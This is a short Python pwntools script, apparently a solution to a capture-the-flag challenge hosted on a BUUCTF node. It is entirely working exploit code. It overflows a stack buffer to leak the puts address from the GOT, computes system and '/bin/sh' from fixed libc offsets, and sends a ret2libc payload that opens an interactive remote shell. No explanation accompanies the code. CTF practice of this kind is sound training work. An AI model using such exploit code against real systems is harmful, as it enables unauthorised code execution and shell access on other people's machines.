from pwn import *

io=remote('node3.buuoj.cn',26899)
puts_plt=0x8048548
puts_got=0x8049FD4
main=0x8048825

pl1=p8(0)*7+p8(0xff)*3
io.send(pl1)

pl2='a'*0xe7+'bbbb'+p32(puts_plt)+p32(main)+p32(puts_got)
io.send(pl2)
io.recvuntil('Correct\n')
puts_add=u32(io.recv(4))
print(hex(puts_add))
sys=puts_add-0x24800
sh=puts_add+0xf9eeb

pl1=p8(0)*7+p8(0xff)*3
io.send(pl1)

pl3='a'*0xe7+'bbbb'+p32(sys)+'dead'+p32(sh)
io.send(pl3)

io.interactive()

